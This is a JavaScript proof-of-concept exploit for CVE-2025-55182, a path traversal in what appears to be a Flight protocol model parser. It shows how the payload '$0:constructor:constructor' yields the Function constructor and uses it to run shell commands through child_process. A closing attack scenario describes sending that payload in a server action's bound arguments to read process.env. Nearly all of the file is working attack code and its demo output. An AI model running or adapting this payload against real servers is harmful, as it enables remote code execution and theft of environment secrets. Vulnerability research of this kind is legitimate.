/**
 * CVE-2025-55182 - Path Traversal RCE Exploit v2
 *
 * The key insight: $<reference> (with any char after $) falls through to
 * getOutlinedModel, and the result is returned directly via createModel.
 *
 * Payload: $0:constructor:constructor
 * Result: Function constructor
 *
 * When this appears in the bound args of a server action,
 * the action receives Function as an argument!
 *
 * Combined with a server action that CALLS its argument, we get RCE.
 */

console.log("=== CVE-2025-55182 Path Traversal Exploit v2 ===\n");

// Simulate parseModelString for the $ fallback case
function parseModelString(response, obj, key, value, reference) {
  if ("$" === value[0]) {
    // ... other $ cases handled first ...

    // Fallback: slice off $ and use as reference
    value = value.slice(1);
    return getOutlinedModel(response, value, obj, key, createModel);
  }
  return value;
}

function getOutlinedModel(response, reference, parentObject, key, map) {
  reference = reference.split(":");
  var id = parseInt(reference[0], 16);
  var chunkValue = response.chunks[id];

  // Path traversal!
  for (var i = 1; i < reference.length; i++) {
    chunkValue = chunkValue[reference[i]];
  }

  return map(response, chunkValue);
}

function createModel(response, model) {
  return model;  // Just returns the value directly!
}

// Test
const response = {
  chunks: {
    0: { someKey: "someValue" }  // Any object
  }
};

console.log("Payload: $0:constructor:constructor");
const result = parseModelString(
  response,
  {},
  "testKey",
  "$0:constructor:constructor",
  undefined
);

console.log("Result:", result);
console.log("Is Function:", result === Function);

if (result === Function) {
  console.log("\n=== RCE Demo ===");
  const maliciousCode = 'return require("child_process").execSync("whoami").toString()';
  try {
    const rce = result(maliciousCode)();
    console.log("RCE Result:", rce);
  } catch(e) {
    // Modern Node.js
    const asyncCode = 'return import("child_process").then(m => m.execSync("whoami").toString())';
    result(asyncCode)().then(r => console.log("RCE Result:", r));
  }
}

console.log("\n=== Attack Scenario ===");
console.log(`
For this to work in a real attack:

1. The attacker sends a Flight protocol request where the bound args
   contain: "$0:constructor:constructor"

2. When parsed by reviveModel, this becomes the Function constructor

3. The server action receives Function as an argument

4. If the action calls this argument (e.g., callback pattern), RCE!

Example vulnerable server action:
  async function processData(callback) {
    const data = await fetchData();
    return callback(data);  // Calls attacker's Function!
  }

With payload: bound = ["$0:constructor:constructor", "return process.env"]
The action becomes: processData(Function, "return process.env")
If action does: callback(arg) -> Function("return process.env")() -> RCE!

But this requires a specific action pattern...

The simpler attack: The path traversal itself is used in a context
where the result is CALLED as a function. Let's find that path.
`);
